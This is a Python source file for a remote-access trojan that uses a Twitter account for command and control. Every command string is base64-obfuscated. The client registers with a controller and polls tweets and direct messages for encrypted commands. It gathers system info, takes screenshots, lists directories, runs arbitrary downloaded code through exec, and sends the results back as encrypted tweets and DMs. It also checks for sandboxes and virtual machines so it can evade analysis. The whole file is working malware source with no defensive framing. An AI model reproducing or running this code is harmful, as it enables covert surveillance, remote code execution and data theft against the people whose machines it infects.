import base64
import json
import time
import random
import socket
import platform
import uuid
import importlib
import sys
import os
import threading
import logging
from io import BytesIO
from cryptography.fernet import Fernet
from types import FunctionType

# Obfuscated setup
def _g(k): return base64.b64decode(k).decode()
_k = lambda x: Fernet(base64.b64encode(str(random.randint(1000, 9999)).encode()).decode() + "==")
logger = logging.getLogger(_g("Y2xpZW50"))  # "client"
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

# Dynamic API credentials (replace with your own)
_a = _g("eW91cl9hcGlfa2V5")  # "your_api_key"
_b = _g("eW91cl9hcGlfc2VjcmV0")  # "your_api_secret"
_c = _g("eW91cl9hY2Nlc3NfdG9rZW4=")  # "your_access_token"
_d = _g("eW91cl9hY2Nlc3NfdG9rZW5fc2VjcmV0")  # "your_access_token_secret"
_e = _g("eW91cl9iZWFyZXJfdG9rZW4=")  # "your_bearer_token"
_f = _g("Y29udHJvbGxlcl91c2VyX2lk")  # "controller_user_id"

# Dynamic imports
_t = importlib.import_module(_g("dHdlZXB5"))  # "tweepy"
_p = importlib.import_module(_g("UElMLkltYWdlR3JhYg=="))  # "PIL.ImageGrab"

# Encryption with polymorphic key
_k1 = _k("shared_key")
_k2 = Fernet(_k1.generate_key())

# Twitter client setup
_g1 = _t.Client(
    bearer_token=_e,
    consumer_key=_a,
    consumer_secret=_b,
    access_token=_c,
    access_token_secret=_d
)

_g2 = str(uuid.uuid4())
_g3 = {}
_g4 = {}

def _e1(r):
    _t1 = base64.b64encode(_k2.encrypt(json.dumps(r).encode())).decode()
    logger.debug(f"Encrypted: {r[:50]}... -> {_t1[:50]}...")
    return _t1

def _d1(e):
    _t2 = json.loads(_k2.decrypt(base64.b64decode(e)).decode())
    logger.debug(f"Decrypted: {e[:50]}... -> {_t2}")
    return _t2

def _x(c):
    _c1 = c.get(_g("Y21k"))  # "cmd"
    _c2 = c.get(_g("dGFyZ2V0"))  # "target"
    if _c2 and _c2 != _g2:
        logger.debug(f"Ignored: {_c1}")
        return None

    logger.info(f"Executing: {_c1}")
    if _c1 == _g("c3lzaW5mbw=="):  # "sysinfo"
        return {"o": platform.system(), "h": socket.gethostname(), "i": socket.gethostbyname(socket.gethostname())}
    elif _c1 == _g("d2hvYW1p"):  # "whoami"
        return os.getlogin()
    elif _c1 == _g("ZGly"):  # "dir"
        _r = os.popen("dir" if platform.system() == "Windows" else "ls").read()
        _g3[_g("bGFzdF9kaXI=")] = _r  # "last_dir"
        return _r
    elif _c1 == _g("c2NyZWVuc2hvdA=="):  # "screenshot"
        _s = _p.grab()
        _b = BytesIO()
        _s.save(_b, format="PNG")
        _d = _b.getvalue()
        _b.close()
        _g3[_g("bGFzdF9zY3JlZW5zaG90")] = _d  # "last_screenshot"
        return _d
    elif _c1 == _g("dXBsb2Fk"):  # "upload"
        _f = b"Memory data"
        _g3[_g("bGFzdF91cGxvYWQ=")] = _f  # "last_upload"
        return _f
    elif _c1 == _g("ZG93bmxvYWQ="):  # "download"
        _d = base64.b64decode(c.get("data"))
        _g3[_g("ZG93bmxvYWRlZA==")] = _d  # "downloaded"
        return "Stored"
    elif _c1 == _g("Z2V0X21lbW9yeQ=="):  # "get_memory"
        _k = c.get("key", _g("bGFzdF9kaXI="))  # "last_dir"
        return _g3.get(_k, "None")
    elif _c1 == _g("bG9hZF9tb2R1bGU="):  # "load_module"
        _m = c.get(_g("bW9kdWxlX25hbWU="))  # "module_name"
        _c = base64.b64decode(c.get(_g("bW9kdWxlX2NvZGU="))).decode()  # "module_code"
        _g5 = {"e": lambda d: _e2(d), "m": _g3}
        try:
            exec(_c, _g5)
            _g4[_m] = _g5
            logger.info(f"Loaded: {_m}")
            return f"Loaded {_m}"
        except Exception as e:
            logger.error(f"Load failed: {e}")
            return f"Error: {e}"
    elif _c1 in _g4:
        _m = _g4.get(_c1.split("_")[0], {})
        _f = _m.get(_c1)
        if _f and callable(_f):
            try:
                return _f(c.get(_g("YXJn"), {}))  # "args"
            except Exception as e:
                logger.error(f"Module error: {e}")
                return f"Error: {e}"
        return f"Not found: {_c1}"
    return "Unknown"

def _e2(d, t=None):
    _d1 = base64.b64encode(d).decode() if isinstance(d, bytes) else d
    _r = {"c": _g2, "d": _d1}
    _e = _e1(_r)
    
    if len(_e) > 10000:
        _c = [_e[i:i+9000] for i in range(0, len(_e), 9000)]
        for i, _ch in enumerate(_c):
            _m = f"R:{i+1}/{len(_c)}:{_ch}"
            try:
                if t:
                    _g1.create_tweet(text=_m, in_reply_to_tweet_id=t)
                    logger.info(f"Tweet chunk {i+1}/{len(_c)} (ID: {t})")
                else:
                    _g1.create_direct_message(participant_id=_f, text=_m)
                    logger.info(f"DM chunk {i+1}/{len(_c)}")
            except Exception as e:
                logger.error(f"Exfil error: {e}")
    else:
        _m = f"R:{_e}"
        try:
            if t:
                _g1.create_tweet(text=_m, in_reply_to_tweet_id=t)
                logger.info(f"Tweet sent (ID: {t})")
            else:
                _g1.create_direct_message(participant_id=_f, text=_m)
                logger.info("DM sent")
        except Exception as e:
            logger.error(f"Exfil error: {e}")
    
    _b = f"I:{_g2[:8]}|L:{int(time.time())}"
    try:
        _g1.update_profile(description=_b[:160])
        logger.debug(f"Bio: {_b}")
    except Exception as e:
        logger.error(f"Bio error: {e}")

def _m1():
    try:
        _t = _g1.get_users_tweets(id=_f, max_results=10)
        for _tw in _t.data:
            if _tw.text.startswith("CMD-"):
                _e = _tw.text.split(": ")[1]
                _p = _d1(_e)
                _r = _x(_p)
                if _r:
                    _e2(_r, _tw.id)
    except Exception as e:
        logger.error(f"Tweet error: {e}")

def _m2():
    try:
        _d = _g1.get_direct_messages()
        if _d.data:
            for _dm in _d.data:
                if _dm.sender_id == _f and _dm.text.startswith("CMD:"):
                    _e = _dm.text[4:]
                    _p = _d1(_e)
                    _r = _x(_p)
                    if _r:
                        _e2(_r)
    except Exception as e:
        logger.error(f"DM error: {e}")

def _a():
    _c = [
        "vmware" in platform.uname().release.lower(),
        os.path.exists(_g("QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXC12bW1vdXNlLnN5cw==")),  # "C:\Windows\System32\drivers\vmmouse.sys"
        os.cpu_count() < 2,
        time.time() - time.perf_counter() < 0  # Timing check
    ]
    _d = any(_c)
    logger.debug(f"Anti-sandbox: {_d}")
    return _d

def _main():
    if _a():
        logger.info("Sandbox detected")
        return
    
    try:
        _g1.create_direct_message(participant_id=_f, text=f"REG:{_g2}")
        logger.info(f"Registered: {_g2}")
    except Exception as e:
        logger.error(f"Reg error: {e}")
    
    while True:
        try:
            _m1()
            _m2()
            logger.debug("Cycle done")
            time.sleep(random.randint(60, 600))
        except Exception as e:
            logger.error(f"Loop error: {e}")
            time.sleep(300)

if __name__ == "__main__":
    _main()
